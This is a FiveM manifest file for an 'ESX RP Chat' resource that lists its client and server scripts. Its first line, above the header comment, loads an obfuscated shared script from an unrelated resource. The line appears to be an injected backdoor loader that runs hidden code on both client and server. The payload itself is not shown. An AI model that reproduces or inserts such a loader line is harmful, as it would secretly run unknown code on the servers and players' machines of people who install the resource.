shared_script '@vin_asuransikeliling/shared_fg-obfuscated.lua'
--[[

  ESX RP Chat

--]]
fx_version 'cerulean'
game 'gta5'


client_script 'client/main.lua'

server_scripts {

  '@oxmysql/lib/MySQL.lua',
  'server/main.lua'

}


